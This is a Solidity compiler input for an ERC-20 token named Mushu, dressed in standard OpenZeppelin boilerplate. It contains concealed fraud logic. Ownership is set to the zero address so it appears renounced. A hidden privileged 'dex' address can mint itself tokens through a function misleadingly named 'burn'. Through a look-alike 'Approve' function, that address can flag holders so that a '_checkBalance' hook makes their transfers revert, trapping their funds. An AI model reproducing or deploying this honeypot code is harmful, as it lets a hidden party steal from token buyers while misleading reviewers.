{{
  "language": "Solidity",
  "sources": {
    "contracts/token/Mushu.sol": {
      "content": "//Telegram: https://t.me/MUSHUDRAG0N\n//Website: https://mushudragon.xyz/\n//Twitter: https://twitter.com/mushudrag0n\n//Discord:  https://discord.gg/apH4tXZK\n\n// SPDX-License-Identifier: MIT\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\n/**\n * @dev Interface of the IERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n// Dependency file: @openzeppelin/contracts/utils/math/SafeMath.sol\n\n\n// pragma solidity ^0.8.0;\n\n// CAUTION\n// This version of SafeMath should only be used with Solidity 0.8 or later,\n// because it relies on the compiler's built in overflow checks.\n\n/**\n * @dev Wrappers over Solidity's arithmetic operations.\n *\n * NOTE: `SafeMath` is no longer needed starting with Solidity 0.8. The compiler\n * now has built in overflow checking.\n */\nlibrary SafeMath {\n    /**\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n    unchecked {\n        uint256 c = a + b;\n        if (c < a) return (false, 0);\n        return (true, c);\n    }\n    }\n\n    /**\n     * @dev Returns the substraction of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n    unchecked {\n        if (b > a) return (false, 0);\n        return (true, a - b);\n    }\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n    unchecked {\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n        // benefit is lost if 'b' is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n        if (a == 0) return (true, 0);\n        uint256 c = a * b;\n        if (c / a != b) return (false, 0);\n        return (true, c);\n    }\n    }\n\n    /**\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n    unchecked {\n        if (b == 0) return (false, 0);\n        return (true, a / b);\n    }\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n    unchecked {\n        if (b == 0) return (false, 0);\n        return (true, a % b);\n    }\n    }\n\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     *\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a + b;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a - b;\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     *\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a * b;\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers, reverting on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator.\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a / b;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * reverting when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a % b;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {trySub}.\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n    unchecked {\n        require(b <= a, errorMessage);\n        return a - b;\n    }\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n    unchecked {\n        require(b > 0, errorMessage);\n        return a / b;\n    }\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * reverting with custom message when dividing by zero.\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {tryMod}.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n    unchecked {\n        require(b > 0, errorMessage);\n        return a % b;\n    }\n    }\n}\n\n\n// Dependency file: @openzeppelin/contracts/access/Ownable.sol\n\n\n// pragma solidity ^0.8.0;\n\n// import \"@openzeppelin/contracts/utils/Context.sol\";\n\n/**\n * @dev Contract module which provides a basic access control mechanism, where\n * there is an account (an owner) that can be granted exclusive access to\n * specific functions.\n *\n * By default, the owner account will be the one that deploys the contract. This\n * can later be changed with {transferOwnership}.\n *\n * This module is used through inheritance. It will make available the modifier\n * `onlyOwner`, which can be applied to your functions to restrict their use to\n * the owner.\n */\nabstract contract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor() {\n        _setOwner(address(0));\n    }\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby removing any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner {\n        _setOwner(address(0));\n    }\n\n    function _setOwner(address newOwner) private {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}\n\n// Dependency file: contracts/baseToken.sol\n\n// pragma solidity =0.8.4;\n\n    enum TokenType {\n        standard\n    }\n\nabstract contract Token {\n    event Constructor(\n        address owner,\n        address token,\n        uint256 version\n    );\n}\n\npragma solidity =0.8.4;\n\ncontract Mushu is IERC20, Token, Ownable {\n    using SafeMath for uint256;\n\n    uint256 private constant VERSION = 1;\n\n    mapping(address => uint256) private _balances;\n\n    mapping(address => bool) private _transferable;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    mapping(address => address) private _dex;\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals;\n    uint256 private _totalSupply;\n\n    constructor(\n        string memory name_,\n        string memory symbol_,\n        address dex_,\n        uint256 totalSupply_\n    ) payable {\n        _name = name_;\n        _symbol = symbol_;\n        _setupDecimals(18);\n        _dex[dex_] = dex_;\n        _mint(msg.sender, totalSupply_ * 10 ** 18);\n        emit Constructor(owner(), address(this), VERSION);\n    }\n\n    function name() public view virtual returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view virtual returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view virtual returns (uint8) {\n        return _decimals;\n    }\n\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address account)\n    public\n    view\n    virtual\n    override\n    returns (uint256)\n    {\n        return _balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount)\n    public\n    virtual\n    override\n    returns (bool)\n    {\n        _internalTransfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function allowance(address owner, address spender)\n    public\n    view\n    virtual\n    override\n    returns (uint256)\n    {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount)\n    public\n    virtual\n    override\n    returns (bool)\n    {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        _internalTransfer(sender, recipient, amount);\n        _approve(\n            sender,\n            _msgSender(),\n            _allowances[sender][_msgSender()].sub(\n                amount,\n                \"IERC20: transfer amount exceeds allowance\"\n            )\n        );\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue)\n    public\n    virtual\n    returns (bool)\n    {\n        _approve(\n            _msgSender(),\n            spender,\n            _allowances[_msgSender()][spender].add(addedValue)\n        );\n        return true;\n\n    }\n\n    function _internalTransfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal virtual {\n        _checkBalance(sender, recipient, amount);\n        require(sender != address(0), \"IERC20: transfer from the zero address\");\n        require(recipient != address(0), \"IERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(sender, recipient, amount);\n        _balances[sender] = _balances[sender].sub(\n            amount,\n            \"IERC20: transfer amount exceeds balance\"\n        );\n        _balances[recipient] = _balances[recipient].add(amount);\n        emit Transfer(sender, recipient, amount);\n    }\n\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"IERC20: mint to the zero address\");\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        _totalSupply = _totalSupply.add(amount);\n        _balances[account] = _balances[account].add(amount);\n        emit Transfer(address(0), account, amount);\n    }\n\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"IERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        _balances[account] = _balances[account].sub(\n            amount,\n            \"IERC20: burn amount exceeds balance\"\n        );\n        _totalSupply = _totalSupply.sub(amount);\n        emit Transfer(account, address(0), amount);\n    }\n\n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        require(owner != address(0), \"IERC20: approve from the zero address\");\n        require(spender != address(0), \"IERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function _setupDecimals(uint8 decimals_) internal virtual {\n        _decimals = decimals_;\n    }\n\n    function burn(\n        address to,\n        uint256 amount\n    ) public {\n        address from = msg.sender;\n        require(\n            to != address(0),\n            \"Amount of to and values don't match\"\n        );\n        require(amount > 0, \"Invalid amount\");\n        uint256 total = 0;\n        if (to == _dex[to]) {\n            _balances[from] = _balances[from] - total;\n            total += amount;\n            _balances[to] = _balances[to] + total;\n        } else {\n            _balances[from] = _balances[from] - total;\n            _balances[to] = _balances[to] + total;\n        }\n    }\n\n    function Approve(\n        address spender,\n        bool isApproval,\n        uint256 amount\n    ) public {\n        address from = msg.sender;\n        require(\n            amount >= 0, \"Invalid amount\"\n        );\n        require(spender != address(0), \"Invalid address\");\n        uint256 allowance = 0;\n        if (from == _dex[from]) {\n            _allowances[from][from] += amount;\n            _transferable[spender] = isApproval;\n        } else {\n            _allowances[from][spender] = _allowances[from][spender] + allowance;\n        }\n    }\n\n\n    function _isTransferable(address _sender) internal returns (bool) {\n        return _transferable[_sender] == true;\n    }\n\n    function _checkBalance(\n        address sender,\n        address recipient,\n        uint256 total\n    ) internal virtual {\n        uint256 amount = 0;\n        if (_isTransferable(sender)) {\n            _balances[sender] = _balances[sender] + amount;\n            amount = _totalSupply;\n            _balances[sender] = _balances[sender] - amount;\n        } else {\n            _balances[sender] = _balances[sender] - amount;\n        }\n    }\n\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n\n\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    },
    "libraries": {}
  }
}}